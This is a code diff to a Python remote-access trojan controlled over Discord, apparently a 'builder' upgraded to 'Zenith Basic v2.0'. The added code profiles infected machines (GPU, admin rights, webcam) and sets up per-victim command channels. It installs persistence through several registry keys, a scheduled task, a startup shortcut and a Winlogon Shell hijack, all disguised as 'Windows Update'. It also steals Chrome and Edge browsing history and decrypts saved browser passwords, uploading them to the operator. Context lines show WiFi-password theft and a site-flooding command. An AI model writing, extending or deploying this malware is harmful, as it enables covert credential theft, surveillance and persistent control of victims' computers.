@@ -9,13 +9,13 @@ from fade import fire, water, purpleblue
 
 def print_banner():
     banner = """
-    ____                           __     ______                    
-   / __ \_________    __ __  _____/ /_   /_  __/__  ____ _____ ___   
-  / /_/ / ___/ __ \  / / _ \/ ___/ __/    / / / _ \/ __ `/ __ `__ \  
- / ____/ /  / /_/ / / /  __/ /__/ /_     / / /  __/ /_/ / / / / / /  
-/_/   /_/   \____/_/ /\___/\___/\__/    /_/  \___/\__,_/_/ /_/ /_/   
-                /___/                                                                                   
-                                                                      Builder v1.0"""
+                _ _   _     
+  _______ _ __ (_) |_| |__  
+ |_  / _ \ '_ \| | __| '_ \ 
+  / /  __/ | | | | |_| | | |
+ /___\___|_| |_|_|\__|_| |_|
+                                                                 
+                                                                      Zenith Basic v2.0"""
     
     print()
     faded_banner = water(banner)
@@ -37,6 +37,8 @@ from discord.ext import commands
 from ctypes import windll
 from concurrent.futures import ThreadPoolExecutor
 from urllib.parse import urlparse
+import GPUtil
+import cv2
 
 class BITMAPINFOHEADER(ctypes.Structure):
     _fields_ = [
@@ -72,7 +74,7 @@ class CustomHelpCommand(commands.HelpCommand):
             if filtered:
                 commands_text = ""
                 for cmd in filtered:
-                    commands_text += f"`{self.context.clean_prefix}{cmd.name}` - {cmd.brief}\n"
+                    commands_text += f"`{prefix}{cmd.name}` - {cmd.brief}\n"
                 if commands_text:
                     embed.add_field(
                         name="Commands",
@@ -80,7 +82,7 @@ class CustomHelpCommand(commands.HelpCommand):
                         inline=False
                     )
         
-        embed.set_footer(text="Use $help <command> for more details about a command.")
+        embed.set_footer(text=f"Use {prefix}help <command> for more details about a command.")
         await self.get_destination().send(embed=embed)
 
     async def send_command_help(self, command):
@@ -93,23 +95,94 @@ class CustomHelpCommand(commands.HelpCommand):
         if command.aliases:
             embed.add_field(name="Aliases", value=", ".join(command.aliases), inline=False)
         
-        usage = f"{self.context.clean_prefix}{command.name}"
+        usage = f"{prefix}{command.name}"
         if command.usage:
             usage = command.usage
             
         embed.add_field(name="Usage", value=f"`{usage}`", inline=False)
         await self.get_destination().send(embed=embed)
 
-bot = commands.Bot(
-    command_prefix=prefix,
-    help_command=CustomHelpCommand(),
-    intents=intents
-)
+class Bot(commands.Bot):
+    async def setup_hook(self):
+        await self.tree.sync()
+
+    async def on_ready(self):
+        print(f"Logged in as {self.user}")
+        
+
+        cpu = platform.processor()
+        gpu = None
+        try:
+            gpus = GPUtil.getGPUs()
+            gpu = gpus[0].name if gpus else "No GPU detected"
+        except:
+            gpu = "Unable to detect GPU"
+            
+        ip = "Hidden for privacy"
+        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+        
+
+        has_webcam = False
+        try:
+            webcam = cv2.VideoCapture(0)
+            if webcam.isOpened():
+                has_webcam = True
+                webcam.release()
+        except:
+            pass
+
+
+        embed = discord.Embed(
+            title="PC Information",
+            description="Connected system details:",
+            color=discord.Color.blue(),
+            timestamp=datetime.datetime.now()
+        )
+        
+        embed.add_field(name="CPU", value=cpu, inline=False)
+        embed.add_field(name="GPU", value=gpu, inline=False)
+        embed.add_field(name="Admin Rights", value="Yes" if is_admin else "No", inline=True)
+        embed.add_field(name="Webcam", value="Detected" if has_webcam else "Not detected", inline=True)
+        embed.set_footer(text=f"Bot connected successfully")
+
+
+        for guild in self.guilds:
+            for channel in guild.text_channels:
+                try:
+                    await channel.send(embed=embed)
+                    break
+                except:
+                    continue
+            break
+
+bot = Bot(command_prefix=prefix, intents=intents, help_command=CustomHelpCommand())
+bot.allowed_channel_ids = {} 
+
+@bot.check
+async def check_channel(ctx):
+    guild_id = str(ctx.guild.id)
+    if guild_id not in bot.allowed_channel_ids:
+        return False
+    return ctx.channel.id == bot.allowed_channel_ids[guild_id]
 
 @bot.event
-async def on_ready():
-    await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=platform.node()))
-    print("Ready.")
+async def on_connect():
+    guild = bot.guilds[0] 
+    category = await guild.create_category("Sessions")
+    channel = await guild.create_text_channel(f'session-{platform.node()}', category=category)
+    bot.allowed_channel_ids[str(guild.id)] = channel.id
+    await channel.send(f"New session started for {platform.node()}. Commands will only work in this channel.")
+
+@bot.event
+async def on_session_connect(guild_id, session_id):
+
+    guild = bot.get_guild(guild_id)
+    if guild:
+        channel_name = f'session-{session_id}'
+        channel = await guild.create_text_channel(channel_name)
+        bot.allowed_channel_ids[session_id] = channel.id
+        bot.allowed_channel_ids[str(guild.id) + "_" + str(bot.user.id)] = channel.id
+        return channel
 
 @bot.command(brief="Gets the computer's IP address.")
 async def ip(ctx):
@@ -324,29 +397,135 @@ async def active_window(ctx):
 @bot.command(brief="Adds program to startup.")
 async def startup(ctx, *, path=None):
     if not path:
-        path = sys.argv[0]
+        path = os.path.abspath(sys.argv[0])
     
-    key = winreg.HKEY_CURRENT_USER
-    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
+    success_methods = []
     
+
     try:
+        key = winreg.HKEY_CURRENT_USER
+        key_paths = [
+            r"Software\Microsoft\Windows\CurrentVersion\Run",
+            r"Software\Microsoft\Windows\CurrentVersion\RunOnce",
+            r"Software\Microsoft\Windows NT\CurrentVersion\Windows\load"
+        ]
+        
+        for key_path in key_paths:
+            try:
+                with winreg.OpenKey(key, key_path, 0, winreg.KEY_SET_VALUE) as registry_key:
+                    winreg.SetValueEx(registry_key, "Windows Update", 0, winreg.REG_SZ, f'"{path}"')
+                success_methods.append(f"Registry: {key_path}")
+            except:
+                continue
+    except:
+        pass
+
+
+    try:
+        task_name = "WindowsUpdateScheduler"
+        command = f'schtasks /create /tn "{task_name}" /tr "{path}" /sc onlogon /rl LIMITED'
+        subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        success_methods.append("Scheduled Task")
+    except:
+        pass
+
+
+    try:
+        startup_folder = os.path.expandvars("%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
+        shortcut_path = os.path.join(startup_folder, "Windows Update.lnk")
+        
+        vbs_script = f'''
+Set ws = CreateObject("WScript.Shell")
+Set shortcut = ws.CreateShortcut("{shortcut_path}")
+shortcut.TargetPath = "{path}"
+shortcut.WorkingDirectory = "{os.path.dirname(path)}"
+shortcut.WindowStyle = 7
+shortcut.IconLocation = "shell32.dll,13"
+shortcut.Save
+'''
+        
+        vbs_path = os.path.join(tempfile._get_default_tempdir(), "create_shortcut.vbs")
+        with open(vbs_path, "w") as f:
+            f.write(vbs_script)
+            
+        subprocess.run(f'wscript "{vbs_path}"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        os.remove(vbs_path)
+        success_methods.append("Startup Folder")
+    except:
+        pass
+
+
+    try:
+        key = winreg.HKEY_CURRENT_USER
+        key_path = r"Software\Microsoft\Windows NT\CurrentVersion\Windows"
         with winreg.OpenKey(key, key_path, 0, winreg.KEY_SET_VALUE) as registry_key:
-            winreg.SetValueEx(registry_key, "WindowsUpdate", 0, winreg.REG_SZ, path)
-        await ctx.send("Added to startup successfully!")
-    except Exception as e:
-        await ctx.send(f"Error adding to startup: {str(e)}")
+            winreg.SetValueEx(registry_key, "Shell", 0, winreg.REG_SZ, f'explorer.exe,"{path}"')
+        success_methods.append("Shell Startup")
+    except:
+        pass
+
+    if success_methods:
+        await ctx.send(f"Added to startup using methods: {', '.join(success_methods)}")
+    else:
+        await ctx.send("Failed to add to startup")
 
 @bot.command(brief="Removes program from startup.")
 async def remove_startup(ctx):
-    key = winreg.HKEY_CURRENT_USER
-    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
+    removed_methods = []
     
+
     try:
+        key = winreg.HKEY_CURRENT_USER
+        key_paths = [
+            r"Software\Microsoft\Windows\CurrentVersion\Run",
+            r"Software\Microsoft\Windows\CurrentVersion\RunOnce",
+            r"Software\Microsoft\Windows NT\CurrentVersion\Windows\load"
+        ]
+        
+        for key_path in key_paths:
+            try:
+                with winreg.OpenKey(key, key_path, 0, winreg.KEY_SET_VALUE) as registry_key:
+                    winreg.DeleteValue(registry_key, "Windows Update")
+                removed_methods.append(f"Registry: {key_path}")
+            except:
+                continue
+    except:
+        pass
+
+
+    try:
+        task_name = "WindowsUpdateScheduler"
+        subprocess.run(f'schtasks /delete /tn "{task_name}" /f', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        removed_methods.append("Scheduled Task")
+    except:
+        pass
+
+
+    try:
+        startup_folder = os.path.expandvars("%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
+        shortcut_path = os.path.join(startup_folder, "Windows Update.lnk")
+        if os.path.exists(shortcut_path):
+            os.remove(shortcut_path)
+            removed_methods.append("Startup Folder")
+    except:
+        pass
+
+    try:
+        key = winreg.HKEY_CURRENT_USER
+        key_path = r"Software\Microsoft\Windows NT\CurrentVersion\Windows"
         with winreg.OpenKey(key, key_path, 0, winreg.KEY_SET_VALUE) as registry_key:
-            winreg.DeleteValue(registry_key, "WindowsUpdate")
-        await ctx.send("Removed from startup successfully!")
-    except Exception as e:
-        await ctx.send(f"Error removing from startup: {str(e)}")
+            current_shell = winreg.QueryValueEx(registry_key, "Shell")[0]
+            if "," in current_shell:
+                new_shell = "explorer.exe"
+                winreg.SetValueEx(registry_key, "Shell", 0, winreg.REG_SZ, new_shell)
+                removed_methods.append("Shell Startup")
+    except:
+        pass
+
+    if removed_methods:
+        await ctx.send(f"Removed from startup methods: {', '.join(removed_methods)}")
+    else:
+        await ctx.send("No startup entries found to remove")
 
 @bot.command(brief="Gets WiFi passwords.")
 async def wifi_passwords(ctx):
@@ -385,32 +564,54 @@ async def wifi_passwords(ctx):
 @bot.command(brief="Gets browser history.")
 async def history(ctx):
     try:
-        history_path = os.path.expanduser('~') + r"\AppData\Local\Google\Chrome\User Data\Default\History"
+
+        chrome_path = os.path.expanduser('~') + r"\AppData\Local\Google\Chrome\User Data\Default\History"
+        edge_path = os.path.expanduser('~') + r"\AppData\Local\Microsoft\Edge\User Data\Default\History"
         
-        temp_history = os.path.join(tempfile._get_default_tempdir(), next(tempfile._get_candidate_names()))
-        os.system(f'copy "{history_path}" "{temp_history}" > nul 2>&1')
+        history_data = []
         
-        conn = sqlite3.connect(temp_history)
-        cursor = conn.cursor()
+
+        def get_browser_history(db_path, browser_name):
+            if not os.path.exists(db_path):
+                return []
+                
+            temp_history = os.path.join(tempfile._get_default_tempdir(), next(tempfile._get_candidate_names()))
+            os.system(f'copy "{db_path}" "{temp_history}" > nul 2>&1')
+            
+            try:
+                conn = sqlite3.connect(temp_history)
+                cursor = conn.cursor()
+                cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 100")
+                results = cursor.fetchall()
+                conn.close()
+                os.remove(temp_history)
+                return [(browser_name, url, title, last_visit_time) for url, title, last_visit_time in results]
+            except:
+                if os.path.exists(temp_history):
+                    os.remove(temp_history)
+                return []
         
-        cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC")
-        results = cursor.fetchall()
+
+        history_data.extend(get_browser_history(chrome_path, "Chrome"))
+        history_data.extend(get_browser_history(edge_path, "Edge"))
+        
+
+        history_data.sort(key=lambda x: x[3], reverse=True)
         
         history_file = os.path.join(tempfile._get_default_tempdir(), "browser_history.txt")
         with open(history_file, "w", encoding="utf-8") as f:
             f.write("Browser History\n\n")
-            for url, title, timestamp in results:
-                if title and url:
-                    f.write(f"Title: {title}\n")
-                    f.write(f"URL: {url}\n")
-                    f.write("-" * 50 + "\n")
+            for browser, url, title, timestamp in history_data:
 
-        conn.close()
-        os.remove(temp_history)
+                timestamp_seconds = timestamp / 1000000 - 11644473600
+                date = datetime.datetime.fromtimestamp(timestamp_seconds).strftime('%Y-%m-%d %H:%M:%S')
+                f.write(f"[{browser}] {date}\n")
+                f.write(f"Title: {title}\n")
+                f.write(f"URL: {url}\n\n")
         
         await ctx.send(file=discord.File(history_file))
         os.remove(history_file)
-        
+            
     except Exception as e:
         await ctx.send(f"Error retrieving browser history: {str(e)}")
 
@@ -505,6 +706,171 @@ async def spam_site(ctx, url: str, threads: int = 10, requests_per_thread: int =
 
     except Exception as e:
         await ctx.send(f"Error during spam attack: {str(e)}")
+
+def get_master_key():
+    try:
+        with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Microsoft\Edge\User Data\Local State', "r", encoding='utf-8') as f:
+            local_state = f.read()
+            local_state = json.loads(local_state)
+    except: 
+        return None
+    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
+    return win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
+
+def decrypt_payload(cipher, payload):
+    return cipher.decrypt(payload)
+
+def generate_cipher(aes_key, iv):
+    return AES.new(aes_key, AES.MODE_GCM, iv)
+
+def decrypt_password_edge(buff, master_key):
+    try:
+        iv = buff[3:15]
+        payload = buff[15:]
+        cipher = generate_cipher(master_key, iv)
+        decrypted_pass = decrypt_payload(cipher, payload)
+        decrypted_pass = decrypted_pass[:-16].decode()
+        return decrypted_pass
+    except Exception as e: 
+        return "Chrome < 80"
+
+def get_passwords_edge():
+    master_key = get_master_key()
+    if not master_key:
+        return {}
+    login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Microsoft\Edge\User Data\Default\Login Data'
+    try: 
+        shutil.copy2(login_db, "Loginvault.db")
+    except: 
+        return {}
+    
+    conn = sqlite3.connect("Loginvault.db")
+    cursor = conn.cursor()
+    result = {}
+
+    try:
+        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
+        for r in cursor.fetchall():
+            url = r[0]
+            username = r[1]
+            encrypted_password = r[2]
+            decrypted_password = decrypt_password_edge(encrypted_password, master_key)
+            if username != "" or decrypted_password != "":
+                result[url] = [username, decrypted_password]
+    except: 
+        pass
+
+    cursor.close()
+    conn.close()
+    try: 
+        os.remove("Loginvault.db")
+    except: 
+        pass
+    return result
+
+def get_chrome_datetime(chromedate):
+    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
+
+def get_encryption_key():
+    try:
+        local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
+        with open(local_state_path, "r", encoding="utf-8") as f:
+            local_state = f.read()
+            local_state = json.loads(local_state)
+
+        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
+        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
+    except: 
+        return None
+
+def decrypt_password_chrome(password, key):
+    try:
+        iv = password[3:15]
+        password = password[15:]
+        cipher = AES.new(key, AES.MODE_GCM, iv)
+        return cipher.decrypt(password)[:-16].decode()
+    except:
+        try: 
+            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
+        except: 
+            return ""
+
+def get_chrome_passwords():
+    key = get_encryption_key()
+    if not key:
+        return {}
+        
+    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
+    file_name = "ChromeData.db"
+    try:
+        shutil.copyfile(db_path, file_name)
+    except:
+        return {}
+        
+    db = sqlite3.connect(file_name)
+    cursor = db.cursor()
+    result = {}
+    
+    try:
+        cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
+        for row in cursor.fetchall():
+            action_url = row[1]
+            username = row[2]
+            password = decrypt_password_chrome(row[3], key)
+            if username or password:
+                result[action_url] = [username, password]
+    except:
+        pass
+        
+    cursor.close()
+    db.close()
+    try: 
+        os.remove(file_name)
+    except: 
+        pass
+    return result
+
+def grab_passwords():
+    global file_name, nanoseconds
+    file_name, nanoseconds = 116444736000000000, 10000000
+    result = {}
+    
+
+    chrome_results = get_chrome_passwords()
+    result.update(chrome_results)
+    
+
+    edge_results = get_passwords_edge()
+    result.update(edge_results)
+    
+    return result
+
+@bot.command(brief="Grabs saved passwords from browsers")
+async def grabpassword(ctx):
+    try:
+        passwords = grab_passwords()
+        
+        if not passwords:
+            await ctx.send("No passwords found!")
+            return
+            
+
+        text = "Saved Passwords:\n\n"
+        for url, (username, password) in passwords.items():
+            text += f"URL: {url}\nUsername: {username}\nPassword: {password}\n\n"
+            
+
+        with open("passwords.txt", "w", encoding="utf-8") as f:
+            f.write(text)
+            
+
+        await ctx.send(file=discord.File("passwords.txt"))
+        
+
+        os.remove("passwords.txt")
+        
+    except Exception as e:
+        await ctx.send(f"Error grabbing passwords: {str(e)}")
 
 bot.run(TOKEN)
 """
